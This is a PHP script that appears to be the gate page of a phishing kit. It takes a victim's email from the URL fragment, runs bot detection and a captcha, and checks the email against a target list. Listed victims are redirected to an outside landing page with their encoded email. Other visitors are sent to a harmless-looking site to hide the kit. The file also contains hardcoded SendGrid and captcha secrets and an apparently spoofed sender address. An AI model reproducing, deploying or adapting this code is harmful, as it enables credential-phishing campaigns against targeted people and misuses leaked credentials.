<?php
echo '<script>
document.addEventListener("DOMContentLoaded", function() {
    const fragment = window.location.hash.substring(1);
    const query = new URLSearchParams(window.location.search);
    if (fragment && !query.has("hint")) {
        const newUrl = window.location.origin + window.location.pathname + (window.location.search ? "&" : "?") + "hint=" + encodeURIComponent(fragment);
        window.history.replaceState(null, "", newUrl);
        location.reload();
    }
});
</script>';

// Set session expiration to 1 hour
ini_set('session.gc_maxlifetime', 3600);
session_start();

use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\PHPMailer;

require_once 'BotDetectLoader.php';
require_once 'vendor/autoload.php';

const DESTINATION = 'https://saleinrealty.com/landing/d57ab7c1-9b58-4df3-9511-128dec8ce60b?';
const FAILED_DESTINATION = 'https://monday.com';
const EMAILS_DATABASE = 'list.txt';
const VERIFY_METHOD = 'database'; // available options: 'code', 'database'

const SMTP_HOST = 'smtp.sendgrid.net';
const SMTP_PORT = 587;
const SMTP_USERNAME = 'apikey';
const SMTP_PASSWORD = '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';
const SMTP_FROM = 'notifications@bivacor.com';
const SMTP_FROM_NAME = 'notifications';
const SMTP_TLS = true; // true: starttls, false: ssl

const CAPTCHA_APIKEY = 'A1H9OBUAU3CCMBSHB7ROF6FKMVGCE0EMH4B03I4898FPQ0E5K1A8POIUT2';
const CAPTCHA_SITEKEY = 'FCML6B4SNLFOUVCO';

function sendCode($email, $code): bool
{
    $mail = new PHPMailer(true);
    try {
        $mail->isSMTP();
        $mail->Host = SMTP_HOST;
        $mail->SMTPAuth = true;
        $mail->Username = SMTP_USERNAME;
        $mail->Password = SMTP_PASSWORD;
        $mail->SMTPSecure = SMTP_TLS ? PHPMailer::ENCRYPTION_STARTTLS : PHPMailer::ENCRYPTION_SMTPS;
        $mail->Port = SMTP_PORT;

        $mail->setFrom(SMTP_FROM, SMTP_FROM_NAME);
        $mail->addAddress($email);

        $mail->isHTML(true);
        $mail->Subject = "$code is your verification code.";
        $mail->Body = str_replace('CODE_PLACEHOLDER', $code, file_get_contents('assets/html/email_template.html'));

        // Set a custom Message ID including the SMTP domain
        $smtpDomain = 'sendgrid.net'; // Ensure this is the correct SMTP domain
        $mail->MessageID = '<' . md5(uniqid()) . '@' . $smtpDomain . '>';

        $mail->send();
        return true;
    } catch (Exception $e) {
        echo $e->getMessage();
        return false;
    }
}

function exportEmail($email)
{
    if (!$email) {
        return $email;
    }
    if (strpos($email, '@') !== false) {
        return $email;
    }
    return base64_decode($email);
}

function verifyCaptcha($solution)
{
    $url = 'https://api.friendlycaptcha.com/api/v1/siteverify';

    $data = [
        'solution' => $solution,
        'secret' => CAPTCHA_APIKEY
    ];

    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];

    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);

    if ($response === FALSE) {
        return false;
    }

    $responseData = json_decode($response, true);

    return $responseData;
}

function loadEmails($filename = EMAILS_DATABASE)
{
    $emails = [];
    $handle = fopen($filename, "r");
    if ($handle) {
        while (($line = fgets($handle)) !== false) {
            $email = strtolower(trim($line));
            if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
                $emails[$email] = true;
            }
        }
        fclose($handle);
    } else {
        die("Unable to open the email database.");
    }
    return $emails;
}


$code_html = file_get_contents('assets/html/code.html');
$email_html = file_get_contents('assets/html/email.html');

$email = $_GET['hint'] ?? '';

if (isset($_POST['txtTOAAEmail'])) {
    $email = $_POST['txtTOAAEmail'];
    $captcha = $_POST['frc-captcha-solution'];
    $result = verifyCaptcha($captcha);

    if (!($result['success'] ?? false)) {
        $error = "Captcha failed, please try again.";
        echo str_replace(['ERROR_PLACEHOLDER', 'EMAIL_PLACEHOLDER', 'SITEKEY_PLACEHOLDER'], [$error, $email, CAPTCHA_SITEKEY], $email_html);
        exit();
    }

    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $error = "Invalid email format.";
        echo str_replace(['ERROR_PLACEHOLDER', 'EMAIL_PLACEHOLDER', 'SITEKEY_PLACEHOLDER'], [$error, $email, CAPTCHA_SITEKEY], $email_html);
        exit();
    }

    if (VERIFY_METHOD === 'code') {
        $code = substr(md5(uniqid(rand(), true)), 0, 6);
        $status = sendCode($email, $code);
        if (!$status) {
            $error = "Sending email failed. Please try again.";
            echo str_replace(['ERROR_PLACEHOLDER', 'EMAIL_PLACEHOLDER', 'SITEKEY_PLACEHOLDER'], [$error, $email, CAPTCHA_SITEKEY], $email_html);
            exit();
        }
        $_SESSION[$email] = $code;

        echo str_replace(['ERROR_PLACEHOLDER', 'EMAIL_PLACEHOLDER'], ['', $email], $code_html);
        exit();
    } else {
        $emailList = loadEmails();
        if (isset($emailList[strtolower(trim($email))])) {
            header('location: ' . DESTINATION . base64_encode($email));
            exit();
        } else {
            if (($_SESSION['attempts'] ?? false) && $_SESSION['attempts'] >= 3) {
                header('location: ' . FAILED_DESTINATION);
                exit();
            }
            $_SESSION['attempts'] = ($_SESSION['attempts'] ?? 0) + 1;
            $error = "Failed to verify your identity, please recheck your email.";
            echo str_replace(['ERROR_PLACEHOLDER', 'EMAIL_PLACEHOLDER', 'SITEKEY_PLACEHOLDER'], [$error, $email, CAPTCHA_SITEKEY], $email_html);
            exit();
        }
    }

}

if (isset($_POST['txtTOAACode'])) {
    if ($email) {
        if (isset($_SESSION[$email])) {
            if ($_POST['txtTOAACode'] == $_SESSION[$email]) {
                header('location: ' . DESTINATION . base64_encode($email));
                exit();
            }
            $error = "The submitted code is invalid.";
            echo str_replace(['ERROR_PLACEHOLDER', 'EMAIL_PLACEHOLDER'], [$error, $email], $code_html);
        } else {
            $error = "Your session has expired. Please try again.";
            echo str_replace(['ERROR_PLACEHOLDER', 'EMAIL_PLACEHOLDER', 'SITEKEY_PLACEHOLDER'], [$error, $email, CAPTCHA_SITEKEY], $email_html);
        }
    } else {
        $error = "Your session has expired. Please try again.";
        echo str_replace(['ERROR_PLACEHOLDER', 'EMAIL_PLACEHOLDER', 'SITEKEY_PLACEHOLDER'], [$error, $email, CAPTCHA_SITEKEY], $email_html);
    }
    exit();
}

echo str_replace(['ERROR_PLACEHOLDER', 'EMAIL_PLACEHOLDER', 'SITEKEY_PLACEHOLDER'], ['', exportEmail($email), CAPTCHA_SITEKEY], $email_html);
?>
